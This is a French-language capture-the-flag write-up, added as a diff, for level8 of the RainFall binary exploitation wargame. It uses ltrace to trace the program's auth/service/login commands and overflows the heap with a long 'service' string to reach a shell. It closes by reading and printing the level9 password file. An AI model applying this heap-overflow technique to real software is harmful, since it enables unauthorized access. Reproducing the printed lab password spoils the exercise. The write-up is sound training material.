@@ -1,0 +1,84 @@
+On lance le programme:
+
+$> ./level8
+(nil), (nil)
+
+Boucle infini qui, on presume, attends deux parametres
+
+$> ltrace ./level8
+__libc_start_main(0x8048564, 1, 0xbffff7d4, 0x8048740, 0x80487b0 <unfinished ...>
+printf("%p, %p \n", (nil), (nil)(nil), (nil)
+)                                = 14
+fgets(test test
+"test test\n", 128, 0xb7fd1ac0)                            = 0xbffff6b0
+printf("%p, %p \n", (nil), (nil)(nil), (nil)
+)                                = 14
+fgets(truc truc
+"truc truc\n", 128, 0xb7fd1ac0)                            = 0xbffff6b0
+printf("%p, %p \n", (nil), (nil)(nil), (nil)
+)                                = 14
+fgets([...]
+
+Il attends bien 2args car dans le printf o voit quil tente de printf les pointeurs de ces args mais il faut rentrer quoi ?
+Nous pouvons faire un cat de ce fichier pour voir qu'il y a 
+
+[...]
+auth resetservicelogin/bin/shPassword:
+[...]
+
+Ou bien on exporte le fichier avec scp et on fait strings [file] dessus afin de voir la meme chose
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth test
+0x804a008, (nil)
+
+level8@RainFall:~$ ltrace ./level8
+[...]
+fgets(auth test
+"auth test\n", 128, 0xb7fd1ac0)                            = 0xbffff6b0
+malloc(4)                                                        = 0x0804a008
+strcpy(0x0804a008, "test\n")                                     = 0x0804a008
+printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil)
+)                            = 18
+
+Il y a un malloc de 4 qui est fait puis un strcpy dans l'adresse du malloc
+Reset n'est pas une commande utile donc on passe a service
+
+level8@RainFall:~$ ltrace ./level8
+[...]
+fgets(auth q
+"auth q\n", 128, 0xb7fd1ac0)                               = 0xbffff6b0
+malloc(4)                                                        = 0x0804a008
+strcpy(0x0804a008, "q\n")                                        = 0x0804a008
+printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil)
+)                            = 18
+fgets(service q
+"service q\n", 128, 0xb7fd1ac0)                            = 0xbffff6b0
+strdup(" q\n")                                                   = 0x0804a018
+printf("%p, %p \n", 0x804a008, 0x804a0180x804a008, 0x804a018
+)                        = 22
+
+On voit que service utilise le meme pointeur que auth et si on essaye de dabord mettre service cela ne fonctionne pas
+Donc c'est bien le auth qui demarre le malloc
+Il y a un strdup qui est fait quand on apelle service, que se passe t'il quand on essaye de faire une chaine un peu plus longue ?
+
+$> ltrace ./level8
+[...]
+fgets(service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+"service AAAAAAAAAAAAAAAAAAAAAAAA"..., 128, 0xb7fd1ac0)    = 0xbffff6b0
+strdup(" AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                    = 0x0804a018
+printf("%p, %p \n", 0x804a008, 0x804a0180x804a008, 0x804a018
+)                        = 22
+
+Ok great, passons a login (mais sans le ltrace)
+
+$> ./level8
+(nil), (nil)
+auth a
+0x804a008, (nil)
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0x804a008, 0x804a018
+login
+$> cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
